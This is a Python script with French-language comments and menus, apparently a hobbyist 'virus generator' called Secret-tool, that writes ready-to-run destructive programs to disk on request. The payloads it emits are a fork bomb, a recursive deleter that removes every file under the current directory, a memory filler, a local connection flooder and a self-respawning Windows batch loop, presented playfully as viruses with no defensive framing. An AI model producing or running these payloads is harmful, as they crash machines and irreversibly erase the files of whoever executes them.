import os
import time

def create_fork_bomb():
    # Crée un fork bomb
    with open("fork_bomb.py", "w") as f:
        f.write("import os\nwhile True:\n\tos.fork()")

def create_file_deleter():
    # Crée un virus qui supprime des fichiers
    with open("file_deleter.py", "w") as f:
        f.write("import os\nfor root, dirs, files in os.walk('.'):\n\tfor file in files:\n\t\tos.remove(os.path.join(root, file))")

def create_memory_filler():
    # Crée un virus qui remplit la mémoire RAM
    with open("memory_filler.py", "w") as f:
        f.write("a = []\nwhile True:\n\ta.append(' '*10**6)")

def create_network_spammer():
    # Crée un virus qui spamme le réseau
    with open("network_spammer.py", "w") as f:
        f.write("import socket\nwhile True:\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(('127.0.0.1', 80))\n\ts.send(b'GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n')")

def create_boot_loop():
    # Crée un virus qui force une boucle de démarrage
    with open("boot_loop.bat", "w") as f:
        f.write("@echo off\n:start\nstart %0\ngoto start")

def display_menu():
    print("""
    ███████╗███████╗ ██████╗██████╗ ███████╗████████╗
    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝
    ███████╗█████╗  ██║     ██████╔╝█████╗     ██║   
    ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   
    ███████║███████╗╚██████╗██║  ██║███████╗   ██║   
    ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
    """)
    print("Bienvenue dans le Secret-tool ! Choisis un virus à créer :")
    print("1. 🧨 Fork Bomb")
    print("2. 🗑️ Suppresseur de fichiers")
    print("3. 🧠 Remplisseur de mémoire RAM")
    print("4. 🌐 Spammeur réseau")
    print("5. 🔄 Boucle de démarrage")
    print("6. 🚪 Quitter")

def main():
    while True:
        display_menu()
        choice = input("Choisis un chiffre (1-6) : ")

        if choice == "1":
            create_fork_bomb()
            print("Fork Bomb créé : fork_bomb.py")
        elif choice == "2":
            create_file_deleter()
            print("Suppresseur de fichiers créé : file_deleter.py")
        elif choice == "3":
            create_memory_filler()
            print("Remplisseur de mémoire RAM créé : memory_filler.py")
        elif choice == "4":
            create_network_spammer()
            print("Spammeur réseau créé : network_spammer.py")
        elif choice == "5":
            create_boot_loop()
            print("Boucle de démarrage créée : boot_loop.bat")
        elif choice == "6":
            print("À plus tard, pirate ! 🏴‍☠️")
            break
        else:
            print("Choix invalide. Essaye encore.")

        time.sleep(2)  # Pause pour l'effet dramatique

if __name__ == "__main__":
    main()
